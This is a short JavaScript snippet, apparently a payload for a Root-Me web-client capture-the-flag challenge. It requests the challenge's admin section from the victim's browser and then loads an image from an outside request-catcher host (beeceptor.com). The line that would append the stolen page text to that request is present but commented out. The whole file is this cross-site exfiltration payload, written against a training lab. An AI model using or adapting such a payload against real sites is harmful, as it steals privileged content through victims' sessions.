var xhr = new XMLHttpRequest();
    xhr.open("GET", "http://challenge01.root-me.org/web-client/ch19/?section=admin", true);

xhr.onreadystatechange = function() {
   if (this.readyState == 4 && this.status == 200) {
      window.document.createElement('img').src="https://forum.free.beeceptor.com/";
                //+encodeURI(this.responseText), true);
      
  }
};

xhr.send(null);
console.log('m2')
